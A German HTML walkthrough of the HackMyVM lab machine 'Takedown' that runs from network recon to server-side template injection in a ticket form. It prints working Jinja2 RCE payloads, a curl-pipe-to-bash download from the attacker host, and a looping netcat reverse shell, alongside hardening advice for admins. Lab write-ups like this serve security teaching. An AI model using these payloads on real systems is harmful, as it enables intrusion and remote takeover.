<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Takedown - HackMyVM - Hard - Bericht</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
    <div class="header-bg">
        <h1>Takedown - HackMyVM - Hard - Bericht</h1>
        <div class="level-container">
            <h2>Hard</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">netcat</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">chisel</div>
                <div class="tool-item">ssh2john</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">openssl</div>
                <div class="tool-item">sudo</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation & Container Escape</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="analysis"><strong>Analyse:</strong> Die Aufklärungsphase begann mit der Identifizierung des Zielsystems im lokalen Netzwerk. Wie üblich habe ich `arp-scan` verwendet, um aktive Geräte zu finden. Anschließend habe ich die Ausgabe mit `grep` und `awk` gefiltert, um direkt die IP-Adresse zu extrahieren. Ein von mir erstelltes Hilfsskript, `recon.sh`, wurde dann genutzt, um den Hostnamen `takedown.hmv` zur Vereinfachung in meine lokale `/etc/hosts`-Datei einzutragen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser erste Schritt war schnell und effektiv. Die IP-Adresse des Ziels wurde als `192.168.2.167` identifiziert. Die Verwendung von Skripten zur Automatisierung wiederkehrender Aufgaben wie dem `hosts`-Eintrag ist eine bewährte Methode, um den Workflow zu optimieren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Vorgehen ist Standard und effizient. Für zukünftige Scans sollte immer sowohl eine IPv4- als auch eine IPv6-Aufklärung in Betracht gezogen werden, da auf beiden Protokollebenen unterschiedliche Dienste laufen könnten.<br><strong>Empfehlung (Admin):</strong> Die Erkennung durch `arp-scan` ist in einem lokalen Netzwerk normal. Die Überwachung auf ungewöhnliche Scan-Aktivitäten durch ein NIDS (Network Intrusion Detection System) kann jedoch helfen, nicht autorisierte Aufklärungsversuche zu identifizieren.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿Hackerben)-[~]
└─# <span class="command">arp-scan -l | grep "PC" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
<pre>
192.168.2.167
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿Hackerben)-[~]
└─# <span class="command">./recon.sh takedown.hmv</span></div>
                </div>
                <div class="terminal">
<pre>
 192.168.2.167   takedown.hmv
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich habe einen `Nmap`-Scan im lokalen Netzwerk auf IPv6-Adressen durchgeführt, um ein vollständiges Bild der erreichbaren Dienste zu erhalten. Dieser Scan identifizierte mehrere Geräte, darunter eines mit der MAC-Adresse von "Shenzhen SEI Robotics" und ein anderes, das eindeutig das Zielsystem ist (erkennbar an der Oracle VirtualBox MAC-Adresse) und Port 22 (SSH) offen hat.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der IPv6-Scan liefert zusätzliche Informationen, bestätigt aber vor allem, dass auf der primären IPv6-Adresse des Zielsystems nur SSH läuft. Die anderen gefundenen IPv6-Geräte und Ports scheinen zu anderen Systemen im Netzwerk zu gehören (z.B. ein Smart-TV oder ein anderes IoT-Gerät) und sind für diesen Test irrelevant. Der Fokus bleibt auf dem Zielsystem.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es ist gut, die IPv6-Landschaft zu kennen. Da hier keine zusätzlichen Angriffsvektoren auf dem Zielsystem aufgedeckt wurden, kann der Fokus wieder vollständig auf die IPv4-Adresse gelegt werden, wo üblicherweise mehr Dienste exponiert sind.<br><strong>Empfehlung (Admin):</strong> IPv6 wird oft bei der Härtung von Systemen übersehen. Es ist entscheidend, dass Firewalls und Sicherheitsrichtlinien sowohl für IPv4 als auch für IPv6 konsequent angewendet werden, um zu verhindern, dass Dienste unbeabsichtigt über eine der beiden Protokollfamilien erreichbar sind.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
::::::::::::::::::::::::::::::: Nmap IPv6 Scan :::::::::::::::::::::::::::::

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
  

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 22:35 CEST
Nmap scan report for Ghost-tv (fe80::463a:9801:878a:81bb)
Host is up (0.00036s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt
9000/tcp open  cslistener
MAC Address: 8C:98:06:22:C3:49 (Shenzhen SEI Robotics)

Nmap scan report for osiris (fe80::a00:27ff:fe9f:d211)
Host is up (0.00010s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
<span class="command">22/tcp open  ssh</span>
MAC Address: 08:00:27:9F:D2:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for fe80::a00:27ff:fe90:9c47
Host is up (0.0000040s latency).
All 1000 scanned ports on fe80::a00:27ff:fe90:9c47 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 3 IP addresses (3 hosts up) scanned in 13.54 seconds 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nun folgt der `Nmap`-Scan auf die IPv4-Adresse. Eine zusammenfassende Ansicht zeigt zwei offene Ports: Port 22, der den `OpenSSH 8.4p1` Dienst auf einem Debian-System betreibt, und Port 80, auf dem ein `nginx 1.18.0` Webserver läuft.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Diese beiden Ports sind die primären Angriffsvektoren. SSH ist eine moderne Version, daher ist ein direkter Exploit unwahrscheinlich; es bleibt aber ein Ziel für Brute-Force-Angriffe, falls Anmeldedaten gefunden werden. Der nginx-Webserver ist der interessanteste Einstiegspunkt. Webanwendungen sind häufig anfällig für eine Vielzahl von Schwachstellen, daher werde ich meine Bemühungen zunächst auf Port 80 konzentrieren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die klare Strategie ist, den Webserver auf Port 80 gründlich zu untersuchen. Dies umfasst die Suche nach virtuellen Hosts, Verzeichnissen und Anwendungs-Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Die Angriffsfläche ist klein, was gut ist. Beide Dienste (`sshd`, `nginx`) sollten regelmäßig auf Updates überprüft werden. Die Konfiguration des Webservers muss besonders gehärtet werden, da er das Tor zum System darstellt.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
:::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)</span>
<span class="command">80/tcp open  http    nginx 1.18.0</span>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Die vollständige `Nmap`-Ausgabe für IPv4 liefert eine entscheidende Information: Der Webserver auf Port 80 antwortet mit einem Redirect auf `http://shieldweb.che/`. Dies bedeutet, dass der Webserver für virtuelle Hosts konfiguriert ist und der Zugriff über die IP-Adresse nicht zur eigentlichen Anwendung führt.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund. Ohne den Hostnamen `shieldweb.che` in meiner `/etc/hosts`-Datei korrekt auf die IP des Ziels abzubilden, werde ich die eigentliche Webanwendung nicht erreichen können. Dies ist eine gängige Konfiguration, aber sie fungiert als eine erste einfache Hürde für weniger gründliche Angreifer. Der Nmap-Scan hat diese Hürde erfolgreich identifiziert.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist zwingend: Ich muss `shieldweb.che` zu meiner `/etc/hosts`-Datei hinzufügen und dann die Webanwendung unter diesem Hostnamen erneut untersuchen.<br><strong>Empfehlung (Admin):</strong> Die Verwendung von virtuellen Hosts ist eine Standardpraxis. Es bietet jedoch keine wirkliche Sicherheit, da Tools wie Nmap oder Web-Scanner solche Redirects leicht erkennen können. Die Sicherheit muss in der Anwendung selbst liegen, nicht in der Verschleierung ihres Standorts.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 22:36 CEST
Nmap scan report for takedown.hmv (192.168.2.167)
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)</span>
| ssh-hostkey: 
|   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
|   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
|_  256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
<span class="command">80/tcp open  http    nginx 1.18.0</span>
<span class="password">|_http-title: Did not follow redirect to http://shieldweb.che/</span>
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:9F:D2:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.16 ms takedown.hmv (192.168.2.167)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds  
</pre>
                </div>
            </div>
        </section>
    </div>




################################################################################################
    <div class="container">
        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis"><strong>Analyse:</strong> Ein `curl`-Befehl auf die IP-Adresse bestätigt das Ergebnis von Nmap. Der Server antwortet mit einem `HTTP/1.1 301 Moved Permanently` und dem `Location`-Header, der auf `http://shieldweb.che/` verweist. Dies bestätigt die Notwendigkeit, den virtuellen Hostnamen zu verwenden, um die eigentliche Anwendung zu erreichen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Redirect ist eindeutig. Jeder weitere Scan oder manuelle Versuch auf der reinen IP-Adresse wäre fruchtlos. Die gesamte Interaktion muss nun über den Hostnamen `shieldweb.che` erfolgen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Füge den Hostnamen zur `/etc/hosts`-Datei hinzu und starte alle Web-Enumeration-Tools (Nikto, Gobuster, etc.) neu, diesmal mit `http://shieldweb.che/` als Ziel.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung, da dies eine Standardkonfiguration ist. Die Sicherheit muss auf der Anwendungsebene von `shieldweb.che` gewährleistet sein.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
:::::::::::::::::::::::::::::: WEB-Server Scan :::::::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

*   Trying 192.168.2.167:80...
* Connected to 192.168.2.167 (192.168.2.167) port 80
* using HTTP/1.x
&gt; HEAD / HTTP/1.1
&gt; Host: 192.168.2.167
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 301 Moved Permanently
HTTP/1.1 301 Moved Permanently
&lt; Server: nginx/1.18.0
Server: nginx/1.18.0
&lt; Date: Tue, 29 Jul 2025 20:36:48 GMT
Date: Tue, 29 Jul 2025 20:36:48 GMT
&lt; Content-Type: text/html
Content-Type: text/html
&lt; Content-Length: 169
Content-Length: 169
&lt; Connection: keep-alive
Connection: keep-alive
<span class="password">&lt; Location: http://shieldweb.che/</span>
Location: http://shieldweb.che/
&lt; 

* Connection #0 to host 192.168.2.167 left intact 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein `Nikto`-Scan auf die IP-Adresse liefert ebenfalls den Redirect zu `http://shieldweb.che/` und meldet zusätzlich die üblichen fehlenden Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`).</p>
            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die bisherigen Erkenntnisse, liefert aber keine neuen Angriffsvektoren, solange der Scan nicht gegen den korrekten virtuellen Host läuft. Die fehlenden Header sind ein "Low-Risk"-Finding, das für später notiert wird.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wie zuvor: Die Priorität liegt auf der Untersuchung von `http://shieldweb.che/`. Die fehlenden Header können im Abschlussbericht als Härtungsempfehlung aufgeführt werden.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie sicherheitsrelevante HTTP-Header, um die Anwendung gegen clientseitige Angriffe wie Clickjacking zu schützen.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
:::::::::::::::::::::::::::::::: Nikto Scan ::::::::::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.2.167
+ Target Hostname:    192.168.2.167
+ Target Port:        80
+ Start Time:         2025-07-29 22:36:50 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
<span class="password">+ Root page / redirects to: http://shieldweb.che/</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 8102 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-07-29 22:37:02 (GMT2) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Hier führe ich den entscheidenden Schritt aus, um die Anwendung zu erreichen. Ich füge der `/etc/hosts`-Datei meines Systems einen Eintrag hinzu, der den Hostnamen `shieldweb.che` auf die IP-Adresse `192.168.2.167` mappt. Der `tee -a`-Befehl sorgt dafür, dass der Eintrag sowohl auf dem Bildschirm ausgegeben als auch an die Datei angehängt wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist die Voraussetzung für jegliche weitere Interaktion. Nachdem dieser Eintrag gesetzt ist, wird mein Browser (und alle meine Tools) bei einer Anfrage an `http://shieldweb.che/` die korrekte IP-Adresse kontaktieren. Nach der Untersuchung der Webseite entdecke ich eine weitere Subdomain `ticket.shieldweb.che`, die ich ebenfalls zur `/etc/hosts`-Datei hinzufüge. Diese Subdomain führt zu einem Kontaktformular.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach dem Hinzufügen des Hostnamens muss die Webseite `http://shieldweb.che/` und die neu entdeckte Subdomain `http://ticket.shieldweb.che/` erneut und gründlich auf Schwachstellen untersucht werden.<br><strong>Empfehlung (Admin):</strong> Die Offenlegung von Subdomains sollte vermieden werden, wenn sie nicht für die Öffentlichkeit bestimmt sind. Techniken wie Certificate Transparency Logs können oft zur Entdeckung von Subdomains führen, daher ist die Absicherung jeder einzelnen Subdomain entscheidend.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿Hackerben)-[~]
└─# <span class="command">echo "192.168.2.167   takedown.hmv shieldweb.che"  | tee -a "192.168.2.167   takedown.hmv shieldweb.che" /etc/hosts</span></div>
                </div>
                <div class="terminal">
<pre>
192.168.2.167   takedown.hmv shieldweb.che
</pre>
                </div>
            </div>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>
            <p class="analysis"><strong>Analyse:</strong> Ich untersuche das Kontaktformular unter `http://ticket.shieldweb.che/`. Ein direkter Aufruf des Endpunkts `/submit`, an den das Formular wahrscheinlich sendet, resultiert in einem `Method Not Allowed`-Fehler. Dies ist typisch, wenn man eine URL, die für POST-Anfragen gedacht ist, mit einer GET-Anfrage aufruft. Ich teste das Formular anschließend auf eine Command Injection, indem ich im Nachrichtenfeld einen `ping`-Befehl an meine eigene Maschine sende, getrennt durch ein Semikolon.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Command-Injection-Versuch mit `ping` schlägt fehl. Mein `netcat`-Listener auf Port 80 empfängt keinen ICMP-Traffic. Das bedeutet nicht zwangsläufig, dass keine Schwachstelle vorhanden ist, sondern nur, dass dieser spezielle Payload nicht funktioniert hat. Als nächstes teste ich auf eine andere, häufige Schwachstelle in Webanwendungen: Server-Side Template Injection (SSTI).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn ein Injektionsversuch fehlschlägt, ist es wichtig, systematisch andere Injektionsarten zu testen. SSTI ist ein hervorragender Kandidat, insbesondere bei Frameworks wie Jinja2 (Python/Flask), Twig (PHP/Symfony) oder Freemarker (Java). Ein einfacher Payload wie `{{7*7}}` ist ein klassischer erster Test.<br><strong>Empfehlung (Admin):</strong> Jede Benutzereingabe, die auf dem Server verarbeitet und in einer Antwortseite wiedergegeben wird, muss kontextbezogen validiert und bereinigt (escaped) werden. Dies verhindert nicht nur Cross-Site-Scripting (XSS), sondern auch komplexere Angriffe wie SSTI.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿Hackerben)-[/usr/share/wordlists]
└─# <span class="command">nc -lvnp 80</span></div>
                </div>
                <div class="terminal">
<pre>
listening on [any] 80 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.1] 48634
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich sende den SSTI-Test-Payload `{{7*7}}` im Nachrichtenfeld des Formulars ab. Die Antwort der Webseite lautet "Thank you for your message, 49!".</p>
            <p class="evaluation"><strong>Bewertung:</strong> Volltreffer! Die Anwendung hat die mathematische Operation `7*7` ausgeführt und das Ergebnis `49` in die Antwortseite eingefügt. Dies ist der eindeutige Beweis für eine Server-Side Template Injection Schwachstelle. Die Syntax mit den doppelten geschweiften Klammern `{{ ... }}` deutet stark auf ein Template-System wie Jinja2 (verwendet im Python-Framework Flask) hin. Diese Schwachstelle ist oft kritisch und führt direkt zur Remote Code Execution (RCE).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist, die SSTI-Schwachstelle zur Ausführung von beliebigem Code auszunutzen. Ich werde Payloads verwenden, die auf die unterliegenden Python-Objekte zugreifen, um das `os`-Modul zu importieren und Shell-Befehle auszuführen.<br><strong>Empfehlung (Admin):</strong> Dies ist eine kritische Schwachstelle. Template-Systeme sollten niemals mit rohen, unvalidierten Benutzereingaben gerendert werden. Verwenden Sie immer "sandboxed" Umgebungen, wenn sie vom Framework angeboten werden, und stellen Sie sicher, dass Benutzereingaben vor der Übergabe an das Template entsprechend behandelt werden.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
{{7*7}}
<span class="password">Thank you for your message, 49!</span> 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich konstruiere einen fortgeschrittenen SSTI-Payload, um beliebige Betriebssystembefehle auszuführen. Der Payload `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` navigiert durch die Python-Objekthierarchie, um die `popen`-Funktion aus dem `os`-Modul aufzurufen und den `id`-Befehl auszuführen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Payload funktioniert perfekt. Die Antwort enthält die Ausgabe des `id`-Befehls: `uid=0(root) gid=0(root) ...`. Das ist eine schockierende und fantastische Entdeckung: Die Webanwendung läuft direkt mit `root`-Rechten! Dies vereinfacht den Angriff erheblich. Ich muss keine Privilegienerweiterung mehr durchführen, da ich bereits die höchsten Rechte habe. Mein Ziel ist es nun, eine interaktive Shell zu erlangen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da ich bereits `root` bin, ist der Weg frei. Ich werde verschiedene Methoden ausprobieren, um eine Reverse Shell zu bekommen, z.B. mit `nc`, `wget` oder `curl`, um ein Shell-Skript herunterzuladen und auszuführen.<br><strong>Empfehlung (Admin):</strong> Eine Webanwendung darf **niemals** mit `root`-Rechten laufen. Dies ist ein fundamentaler Verstoß gegen das Prinzip der geringsten Rechte (Principle of Least Privilege). Webserver-Prozesse sollten immer unter einem dedizierten, unprivilegierten Benutzerkonto laufen (z.B. `www-data`, `nginx`). Sollte die Anwendung kompromittiert werden, ist der Schaden so auf das Benutzerkonto beschränkt. Hier führt die Kompromittierung direkt zur vollständigen Übernahme des Systems.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
<span class="password">Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) !</span> 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich versuche verschiedene Payloads, um eine interaktive Shell zu bekommen. Der erste Versuch mit `nc -e /bin/bash` führt zu einem Timeout, was darauf hindeutet, dass der Befehl entweder blockiert wird oder die `-e`-Option im verwendeten `netcat`-Binary nicht verfügbar ist. Der Versuch, eine Datei mit `wget` herunterzuladen, funktioniert jedoch, wie die Anfrage auf meinem lokalen Python-HTTP-Server zeigt. Dies bestätigt, dass ich ausgehende Verbindungen herstellen kann.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die `nc -e`-Methode ist unzuverlässig und oft auf gehärteten Systemen nicht verfügbar. Die erfolgreiche `wget`-Anfrage zeigt jedoch, dass der Ansatz, ein Skript vom Angreifer-System zu holen und auszuführen, der richtige Weg ist. Die beste Methode hierfür ist, `curl` zu verwenden, um das Skript direkt in die `bash`-Shell zu pipen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der finale Payload sollte `curl http://[Angreifer-IP]/[script.sh] | bash` sein. Das `script.sh` auf meiner Seite enthält dann einen zuverlässigeren Reverse-Shell-Befehl.<br><strong>Empfehlung (Admin):</strong> Das Einschränken von ausgehenden Verbindungen (Egress-Filtering) auf einem Webserver ist eine wichtige Verteidigungsmaßnahme. Ein Webserver sollte nur Verbindungen zu explizit erlaubten Zielen (z.B. Datenbankserver, API-Endpunkte) aufbauen dürfen. Dies hätte die `wget`- und `curl`-Versuche verhindert.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://192.168.2.199/test.sh | bash').read() }}
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿Hackerben)-[~]
└─# <span class="command">python3 -m http.server 80</span></div>
                </div>
                <div class="terminal">
<pre>
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.2.167 - - [30/Jul/2025 00:23:30] "GET /flag.txt HTTP/1.1" 200 -
<span class="password">192.168.2.167 - - [30/Jul/2025 00:25:02] "GET /test.sh HTTP/1.1" 200 -</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich lese die `/etc/passwd`-Datei aus, um mehr über die verfügbaren Benutzer und ihre Shells zu erfahren. Ich sehe, dass der `root`-Benutzer die `/bin/ash`-Shell verwendet. Dies ist typisch für leichtgewichtige Linux-Distributionen wie Alpine Linux. Andere Benutzer haben `/bin/bash`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Information, dass `ash` die Standard-Shell für `root` ist, ist entscheidend für die Konstruktion eines funktionierenden Reverse-Shell-Payloads. Anstatt `/bin/bash` zu verwenden, werde ich nun `ash` verwenden, da dies mit größerer Wahrscheinlichkeit auf dem System vorhanden und für den `root`-Kontext konfiguriert ist.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Passe den Reverse-Shell-Payload an, um `/bin/ash` oder einfach `ash` zu verwenden. Dies erhöht die Erfolgswahrscheinlichkeit erheblich.<br><strong>Empfehlung (Admin):</strong> Die Kenntnis der System-Shells ist für die Systemhärtung wichtig. Die Verwendung einer restriktiveren Shell (wie `rbash` - restricted bash) für unprivilegierte Benutzer kann deren Aktionsradius nach einer Kompromittierung einschränken.</p>
            <div class="code-block">
                <div class="terminal">
<pre>
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('grep sh /etc/passwd').read() }}

  Thank you for your message, 
<span class="command">root:x:0:0:root:/root:/bin/ash</span>
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
<span class="command">postgres:x:70:70::/var/lib/postgresql:/bin/sh</span>
</pre>
                </div>
            </div>
        </section>
    </div>

    <div class="container">
        <section id="privilege-escalation">
            <h2>Privilege Escalation & Container Escape</h2>
            <p class="analysis"><strong>Analyse:</strong> Ich konstruiere den finalen SSTI-Payload. Anstatt eine einzelne Reverse Shell zu starten, die instabil sein könnte, verwende ich eine `while`-Schleife in meinem Befehl. Der Payload `os.system("ash -c 'while true; do nc 192.168.2.199 4444 -e ash; done'")` startet eine Endlosschleife, die immer wieder versucht, eine `ash`-Shell zu meinem Listener auf Port 4444 zu verbinden. Dies sorgt für eine persistente Shell, selbst wenn die Verbindung einmal abbricht.</p>
